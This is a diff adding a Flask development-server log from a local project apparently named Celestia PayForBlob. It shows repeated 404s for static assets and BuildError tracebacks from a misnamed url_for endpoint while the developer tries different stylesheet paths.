@@ -1,0 +1,1631 @@
+INFO:werkzeug:[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:80
+ * Running on http://10.5.3.35:80
+INFO:werkzeug:[33mPress CTRL+C to quit[0m
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:01:26] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:01:26] "[33mGET /site/assets/css/styles.css HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:01:26] "[33mGET /site/assets/img/celestia-logo.svg HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:01:27] "[33mGET /site/assets/js/simple-notify.min.js HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:01:27] "[33mGET /site/assets/js/main.js HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:01:27] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:01:35] "[33mGET /site/assets/css/styles.css HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:01:44] "[33mGET /site/assets/css/styles.css HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:03:54] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:03:54] "[33mGET /site/assets/css/styles.css HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:03:54] "[33mGET /site/assets/img/celestia-logo.svg HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:03:54] "[33mGET /site/assets/js/simple-notify.min.js HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:03:54] "[33mGET /site/assets/js/main.js HTTP/1.1[0m" 404 -
+INFO:werkzeug:[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:80
+ * Running on http://10.5.3.35:80
+INFO:werkzeug:[33mPress CTRL+C to quit[0m
+ERROR:app:Exception on / [GET]
+Traceback (most recent call last):
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 2528, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 1825, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 1823, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 1799, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "E:\Celestia\PayForBlob\app.py", line 128, in index
+    return render_template('index.html', gas_limit=DEFAULT_GAS_LIMIT, fee=DEFAULT_FEE, node_url=DEFAULT_NODE_URL)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\templating.py", line 147, in render_template
+    return _render(app, template, context)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\templating.py", line 130, in _render
+    rv = template.render(context)
+         ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\jinja2\environment.py", line 1301, in render
+    self.environment.handle_exception()
+  File "C:\Python311\Lib\site-packages\jinja2\environment.py", line 936, in handle_exception
+    raise rewrite_traceback_stack(source=source)
+  File "E:\Celestia\PayForBlob\templates\index.html", line 9, in top-level template code
+    <link rel="stylesheet" href="{{ url_for('site', filename= 'assets/css/style.css') }}" />
+    ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 2034, in url_for
+    return self.handle_url_build_error(error, endpoint, values)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 2023, in url_for
+    rv = url_adapter.build(  # type: ignore[union-attr]
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\werkzeug\routing\map.py", line 917, in build
+    raise BuildError(endpoint, values, method, self)
+werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'site' with values ['filename']. Did you mean 'index' instead?
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:04:02] "[35m[1mGET / HTTP/1.1[0m" 500 -
+ERROR:app:Exception on / [GET]
+Traceback (most recent call last):
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 2528, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 1825, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 1823, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 1799, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "E:\Celestia\PayForBlob\app.py", line 128, in index
+    return render_template('index.html', gas_limit=DEFAULT_GAS_LIMIT, fee=DEFAULT_FEE, node_url=DEFAULT_NODE_URL)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\templating.py", line 147, in render_template
+    return _render(app, template, context)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\templating.py", line 130, in _render
+    rv = template.render(context)
+         ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\jinja2\environment.py", line 1301, in render
+    self.environment.handle_exception()
+  File "C:\Python311\Lib\site-packages\jinja2\environment.py", line 936, in handle_exception
+    raise rewrite_traceback_stack(source=source)
+  File "E:\Celestia\PayForBlob\templates\index.html", line 9, in top-level template code
+    <link rel="stylesheet" href="{{ url_for('site', filename= 'assets/css/style.css') }}" />
+    ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 2034, in url_for
+    return self.handle_url_build_error(error, endpoint, values)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 2023, in url_for
+    rv = url_adapter.build(  # type: ignore[union-attr]
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\werkzeug\routing\map.py", line 917, in build
+    raise BuildError(endpoint, values, method, self)
+werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'site' with values ['filename']. Did you mean 'index' instead?
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:04:04] "[35m[1mGET / HTTP/1.1[0m" 500 -
+ERROR:app:Exception on / [GET]
+Traceback (most recent call last):
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 2528, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 1825, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 1823, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 1799, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "E:\Celestia\PayForBlob\app.py", line 128, in index
+    return render_template('index.html', gas_limit=DEFAULT_GAS_LIMIT, fee=DEFAULT_FEE, node_url=DEFAULT_NODE_URL)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\templating.py", line 147, in render_template
+    return _render(app, template, context)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\templating.py", line 130, in _render
+    rv = template.render(context)
+         ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\jinja2\environment.py", line 1301, in render
+    self.environment.handle_exception()
+  File "C:\Python311\Lib\site-packages\jinja2\environment.py", line 936, in handle_exception
+    raise rewrite_traceback_stack(source=source)
+  File "E:\Celestia\PayForBlob\templates\index.html", line 9, in top-level template code
+    <link rel="stylesheet" href="{{ url_for('site', filename= 'assets/css/style.css') }}" />
+    ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 2034, in url_for
+    return self.handle_url_build_error(error, endpoint, values)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 2023, in url_for
+    rv = url_adapter.build(  # type: ignore[union-attr]
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\werkzeug\routing\map.py", line 917, in build
+    raise BuildError(endpoint, values, method, self)
+werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'site' with values ['filename']. Did you mean 'index' instead?
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:04:13] "[35m[1mGET / HTTP/1.1[0m" 500 -
+INFO:werkzeug:[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:80
+ * Running on http://10.5.3.35:80
+INFO:werkzeug:[33mPress CTRL+C to quit[0m
+ERROR:app:Exception on / [GET]
+Traceback (most recent call last):
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 2528, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 1825, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 1823, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 1799, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "E:\Celestia\PayForBlob\app.py", line 128, in index
+    return render_template('index.html', gas_limit=DEFAULT_GAS_LIMIT, fee=DEFAULT_FEE, node_url=DEFAULT_NODE_URL)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\templating.py", line 147, in render_template
+    return _render(app, template, context)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\templating.py", line 130, in _render
+    rv = template.render(context)
+         ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\jinja2\environment.py", line 1301, in render
+    self.environment.handle_exception()
+  File "C:\Python311\Lib\site-packages\jinja2\environment.py", line 936, in handle_exception
+    raise rewrite_traceback_stack(source=source)
+  File "E:\Celestia\PayForBlob\templates\index.html", line 9, in top-level template code
+    <link rel="stylesheet" href="{{ url_for('site', filename= 'css/style.css') }}" />
+    ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 2034, in url_for
+    return self.handle_url_build_error(error, endpoint, values)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 2023, in url_for
+    rv = url_adapter.build(  # type: ignore[union-attr]
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\werkzeug\routing\map.py", line 917, in build
+    raise BuildError(endpoint, values, method, self)
+werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'site' with values ['filename']. Did you mean 'index' instead?
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:05:49] "[35m[1mGET / HTTP/1.1[0m" 500 -
+ERROR:app:Exception on / [GET]
+Traceback (most recent call last):
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 2528, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 1825, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 1823, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 1799, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "E:\Celestia\PayForBlob\app.py", line 128, in index
+    return render_template('index.html', gas_limit=DEFAULT_GAS_LIMIT, fee=DEFAULT_FEE, node_url=DEFAULT_NODE_URL)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\templating.py", line 147, in render_template
+    return _render(app, template, context)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\templating.py", line 130, in _render
+    rv = template.render(context)
+         ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\jinja2\environment.py", line 1301, in render
+    self.environment.handle_exception()
+  File "C:\Python311\Lib\site-packages\jinja2\environment.py", line 936, in handle_exception
+    raise rewrite_traceback_stack(source=source)
+  File "E:\Celestia\PayForBlob\templates\index.html", line 9, in top-level template code
+    <link rel="stylesheet" href="{{ url_for('site', filename= 'css/style.css') }}" />
+    ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 2034, in url_for
+    return self.handle_url_build_error(error, endpoint, values)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 2023, in url_for
+    rv = url_adapter.build(  # type: ignore[union-attr]
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\werkzeug\routing\map.py", line 917, in build
+    raise BuildError(endpoint, values, method, self)
+werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'site' with values ['filename']. Did you mean 'index' instead?
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:05:54] "[35m[1mGET / HTTP/1.1[0m" 500 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:05:55] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+ERROR:app:Exception on / [GET]
+Traceback (most recent call last):
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 2528, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 1825, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 1823, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 1799, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "E:\Celestia\PayForBlob\app.py", line 128, in index
+    return render_template('index.html', gas_limit=DEFAULT_GAS_LIMIT, fee=DEFAULT_FEE, node_url=DEFAULT_NODE_URL)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\templating.py", line 147, in render_template
+    return _render(app, template, context)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\templating.py", line 130, in _render
+    rv = template.render(context)
+         ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\jinja2\environment.py", line 1301, in render
+    self.environment.handle_exception()
+  File "C:\Python311\Lib\site-packages\jinja2\environment.py", line 936, in handle_exception
+    raise rewrite_traceback_stack(source=source)
+  File "E:\Celestia\PayForBlob\templates\index.html", line 9, in top-level template code
+    <link rel="stylesheet" href="site/assets/css/styles.css" />
+    ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 2034, in url_for
+    return self.handle_url_build_error(error, endpoint, values)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 2023, in url_for
+    rv = url_adapter.build(  # type: ignore[union-attr]
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\werkzeug\routing\map.py", line 917, in build
+    raise BuildError(endpoint, values, method, self)
+werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'site' with values ['filename']. Did you mean 'index' instead?
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:08:35] "[35m[1mGET / HTTP/1.1[0m" 500 -
+INFO:werkzeug:[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:80
+ * Running on http://10.5.3.35:80
+INFO:werkzeug:[33mPress CTRL+C to quit[0m
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:08:41] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:08:41] "[33mGET /site/assets/css/styles.css HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:08:41] "[33mGET /site/assets/img/celestia-logo.svg HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:08:41] "[33mGET /site/assets/js/simple-notify.min.js HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:08:41] "[33mGET /site/assets/js/main.js HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:08:47] "[33mGET /site/assets/css/styles.css HTTP/1.1[0m" 404 -
+INFO:werkzeug:[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:80
+ * Running on http://10.5.3.35:80
+INFO:werkzeug:[33mPress CTRL+C to quit[0m
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:09:28] "[33mGET /site/assets/css/styles.css HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:09:30] "[33mGET /site/css/styles.css HTTP/1.1[0m" 404 -
+INFO:werkzeug:[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:80
+ * Running on http://10.5.3.35:80
+INFO:werkzeug:[33mPress CTRL+C to quit[0m
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:11:20] "[33mGET /site/css/styles.css HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:11:22] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:11:22] "[33mGET /static/css/style.css HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:11:22] "[33mGET /site/assets/img/celestia-logo.svg HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:11:22] "[33mGET /site/assets/js/simple-notify.min.js HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:11:22] "[33mGET /site/assets/js/main.js HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:11:24] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:11:24] "[33mGET /static/css/style.css HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:11:24] "[33mGET /site/assets/img/celestia-logo.svg HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:11:24] "[33mGET /site/assets/js/simple-notify.min.js HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:11:24] "[33mGET /site/assets/js/main.js HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:11:26] "[33mGET /static/css/style.css HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:11:29] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:11:29] "[33mGET /static/css/style.css HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:11:29] "[33mGET /site/assets/img/celestia-logo.svg HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:11:29] "[33mGET /site/assets/js/simple-notify.min.js HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:11:29] "[33mGET /site/assets/js/main.js HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:11:30] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:11:33] "[33mGET /static/css/style.css HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:11:48] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:11:48] "[33mGET /static/css/style.css HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:11:48] "[33mGET /site/assets/img/celestia-logo.svg HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:11:48] "[33mGET /site/assets/js/simple-notify.min.js HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:11:48] "[33mGET /site/assets/js/main.js HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:11:49] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:80
+ * Running on http://10.5.3.35:80
+INFO:werkzeug:[33mPress CTRL+C to quit[0m
+ERROR:app:Exception on / [GET]
+Traceback (most recent call last):
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 2528, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 1825, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 1823, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 1799, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "E:\Celestia\PayForBlob\app.py", line 128, in index
+    return render_template('index.html', gas_limit=DEFAULT_GAS_LIMIT, fee=DEFAULT_FEE, node_url=DEFAULT_NODE_URL)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\templating.py", line 147, in render_template
+    return _render(app, template, context)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\templating.py", line 130, in _render
+    rv = template.render(context)
+         ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\jinja2\environment.py", line 1301, in render
+    self.environment.handle_exception()
+  File "C:\Python311\Lib\site-packages\jinja2\environment.py", line 936, in handle_exception
+    raise rewrite_traceback_stack(source=source)
+  File "E:\Celestia\PayForBlob\templates\index.html", line 9, in top-level template code
+    <link rel="stylesheet" href="{{ url_for('site', filename= 'css/style.css') }}">
+    ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 2034, in url_for
+    return self.handle_url_build_error(error, endpoint, values)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\flask\app.py", line 2023, in url_for
+    rv = url_adapter.build(  # type: ignore[union-attr]
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Python311\Lib\site-packages\werkzeug\routing\map.py", line 917, in build
+    raise BuildError(endpoint, values, method, self)
+werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'site' with values ['filename']. Did you mean 'index' instead?
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:11:55] "[35m[1mGET / HTTP/1.1[0m" 500 -
+INFO:werkzeug:[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:80
+ * Running on http://10.5.3.35:80
+INFO:werkzeug:[33mPress CTRL+C to quit[0m
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:12:08] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:12:08] "[33mGET /static/css/style.css HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:12:08] "[33mGET /site/assets/img/celestia-logo.svg HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:12:08] "[33mGET /site/assets/js/simple-notify.min.js HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:12:08] "[33mGET /site/assets/js/main.js HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:13:47] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:13:47] "[33mGET /static/css/style.css HTTP/1.1[0m" 404 -
